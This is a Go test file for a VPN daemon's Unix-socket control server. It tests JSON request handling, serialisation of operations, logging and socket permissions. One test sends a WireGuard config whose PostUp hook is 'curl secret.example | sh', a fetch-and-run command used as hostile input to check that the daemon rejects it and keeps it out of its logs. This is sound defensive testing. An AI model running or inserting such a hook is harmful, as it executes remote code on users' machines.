package server

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"katacomb.vpn/daemon/internal/ops"
)

// Short socket paths: AF_UNIX caps sun_path at 108 bytes and t.TempDir() is long.
func sockPath(t *testing.T) string {
	t.Helper()
	dir, err := os.MkdirTemp("/tmp", "kvd")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(dir) })
	return filepath.Join(dir, "d.sock")
}

func startServer(t *testing.T, r *rec) (string, *Server) {
	t.Helper()
	path := sockPath(t)
	ln, err := net.Listen("unix", path)
	if err != nil {
		t.Fatal(err)
	}
	var logs []string
	var mu sync.Mutex
	s := New(r.Env, func(f string, a ...any) { mu.Lock(); logs = append(logs, fmt.Sprintf(f, a...)); mu.Unlock() })
	go s.Serve(ln)
	t.Cleanup(func() { ln.Close() })
	return path, s
}

func dial(t *testing.T, path string) net.Conn {
	t.Helper()
	c, err := net.Dial("unix", path)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.Close() })
	return c
}

func readLine(t *testing.T, br *bufio.Reader) string {
	t.Helper()
	l, err := br.ReadString('\n')
	if err != nil {
		t.Fatalf("read: %v (got %q)", err, l)
	}
	return strings.TrimRight(l, "\n")
}

func TestOneRequest(t *testing.T) {
	path, _ := startServer(t, newRec(t))
	c := dial(t, path)
	fmt.Fprint(c, `{"id":1,"op":"protocol_version"}`+"\n")
	if got := readLine(t, bufio.NewReader(c)); got != `{"id":1,"ok":true,"result":{"version":1}}` {
		t.Fatal(got)
	}
}

func TestPipelinedRequestsInOneWrite(t *testing.T) {
	path, _ := startServer(t, newRec(t))
	c := dial(t, path)
	fmt.Fprint(c, `{"id":1,"op":"protocol_version"}`+"\n"+`{"id":2,"op":"status"}`+"\n"+`{"id":3,"op":"frob"}`+"\n")
	br := bufio.NewReader(c)
	want := []string{
		`{"id":1,"ok":true,"result":{"version":1}}`,
		`{"id":2,"ok":true,"result":{"wgUp":false,"tunUp":false,"ovpnUp":false}}`,
		`{"id":3,"ok":false,"error":"unknown op: frob"}`,
	}
	for _, w := range want {
		if got := readLine(t, br); got != w {
			t.Fatalf("want %s, got %s", w, got)
		}
	}
}

func TestOversizedLineClosesWithoutReply(t *testing.T) {
	path, _ := startServer(t, newRec(t))
	c := dial(t, path)
	big := bytes.Repeat([]byte("x"), 256*1024+1)
	if _, err := c.Write(big); err != nil {
		t.Fatal(err)
	}
	c.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 16)
	n, err := c.Read(buf)
	if err != io.EOF || n != 0 {
		t.Fatalf("want a silent close, got n=%d err=%v", n, err)
	}
}

func TestInvalidJsonThenValidOnTheSameConnection(t *testing.T) {
	path, _ := startServer(t, newRec(t))
	c := dial(t, path)
	fmt.Fprint(c, "not json\n"+`{"id":9,"op":"protocol_version"}`+"\n")
	br := bufio.NewReader(c)
	if got := readLine(t, br); got != `{"id":0,"ok":false,"error":"invalid JSON"}` {
		t.Fatal(got)
	}
	if got := readLine(t, br); got != `{"id":9,"ok":true,"result":{"version":1}}` {
		t.Fatal(got)
	}
}

// Deviation 3: these killed the TypeScript daemon (any group member could bounce
// it with `null\n`). Now they are a reply and the daemon carries on.
func TestNonObjectRequestsAreRepliedToNotFatal(t *testing.T) {
	path, _ := startServer(t, newRec(t))
	c := dial(t, path)
	br := bufio.NewReader(c)
	for _, bad := range []string{"null", `"x"`, "[]", "5", `{"op":"status"}`, `{"id":"1","op":"status"}`} {
		fmt.Fprint(c, bad+"\n")
		if got := readLine(t, br); got != `{"id":0,"ok":false,"error":"invalid request"}` {
			t.Fatalf("%s: got %s", bad, got)
		}
	}
	fmt.Fprint(c, "   \n"+`{"id":4,"op":"status"}`+"\n") // blank lines are skipped
	if got := readLine(t, br); !strings.HasPrefix(got, `{"id":4,"ok":true`) {
		t.Fatal(got)
	}
}

func TestStateChangingOpsAreSerialisedAndStatusIsNot(t *testing.T) {
	r := newRec(t)
	var inflight, maxSeen int32
	r.Env.Run = func(_ context.Context, argv []string, _ ops.RunOpt) ([]byte, []byte, error) {
		n := atomic.AddInt32(&inflight, 1)
		for {
			m := atomic.LoadInt32(&maxSeen)
			if n <= m || atomic.CompareAndSwapInt32(&maxSeen, m, n) {
				break
			}
		}
		time.Sleep(60 * time.Millisecond)
		atomic.AddInt32(&inflight, -1)
		return nil, nil, nil
	}
	path, _ := startServer(t, r)
	var wg sync.WaitGroup
	start := time.Now()
	for i := 0; i < 3; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			c := dial(t, path)
			fmt.Fprintf(c, `{"id":%d,"op":"killswitch_off"}`+"\n", id)
			readLine(t, bufio.NewReader(c))
		}(i + 1)
	}
	// A status request while the slow ops queue must not wait for them.
	time.Sleep(20 * time.Millisecond)
	c := dial(t, path)
	t0 := time.Now()
	fmt.Fprint(c, `{"id":99,"op":"status"}`+"\n")
	readLine(t, bufio.NewReader(c))
	if d := time.Since(t0); d > 100*time.Millisecond {
		t.Fatalf("status blocked behind the mutex for %s", d)
	}
	wg.Wait()
	if atomic.LoadInt32(&maxSeen) != 1 {
		t.Fatalf("max concurrent tool runs = %d, want 1", maxSeen)
	}
	// 3 ops x (6 iptables calls x 60ms) run back to back: well over a second.
	if time.Since(start) < 1*time.Second {
		t.Fatalf("ops finished too fast to have been serialised: %s", time.Since(start))
	}
}

func TestRejectionsAreLoggedWithoutTheConfigBody(t *testing.T) {
	r := newRec(t)
	path := sockPath(t)
	ln, err := net.Listen("unix", path)
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	var logs []string
	var mu sync.Mutex
	s := New(r.Env, func(f string, a ...any) { mu.Lock(); logs = append(logs, fmt.Sprintf(f, a...)); mu.Unlock() })
	go s.Serve(ln)
	c := dial(t, path)
	fmt.Fprint(c, `{"id":1,"op":"wireguard_up","args":{"configString":"[Interface]\nPrivateKey = aGVsbG8=\nPostUp = curl secret.example | sh\n"}}`+"\n")
	readLine(t, bufio.NewReader(c))
	mu.Lock()
	defer mu.Unlock()
	joined := strings.Join(logs, "\n")
	if !strings.Contains(joined, "op wireguard_up rejected:") || strings.Contains(joined, "secret.example") {
		t.Fatalf("logs = %q", logs)
	}
}

func TestSocketPermissions(t *testing.T) {
	r := newRec(t)
	// getent fails → 0666 fallback.
	r.Env.Run = func(_ context.Context, argv []string, _ ops.RunOpt) ([]byte, []byte, error) {
		return nil, nil, &ops.ExitError{Argv: argv, Code: 2}
	}
	path := sockPath(t)
	ln, err := net.Listen("unix", path)
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	s := New(r.Env, func(string, ...any) {})
	s.securePermissions(path, os.Getuid())
	if fi, _ := os.Stat(path); fi.Mode().Perm() != 0o666 {
		t.Fatalf("want 0666 fallback, got %o", fi.Mode().Perm())
	}
	// getent resolves → 0660 with that gid (our own gid, so chown works unprivileged).
	gid := os.Getgid()
	r.Env.Run = func(_ context.Context, argv []string, _ ops.RunOpt) ([]byte, []byte, error) {
		if filepath.Base(argv[0]) != "getent" {
			t.Fatalf("unexpected %v", argv)
		}
		return []byte(fmt.Sprintf("katacomb-vpn:x:%d:me\n", gid)), nil, nil
	}
	s.securePermissions(path, os.Getuid())
	if fi, _ := os.Stat(path); fi.Mode().Perm() != 0o660 {
		t.Fatalf("want 0660, got %o", fi.Mode().Perm())
	}
}

func TestDaemonModeRefusesUnprivileged(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root")
	}
	if code := Run(newRec(t).Env); code != 1 {
		t.Fatalf("want exit 1, got %d", code)
	}
}
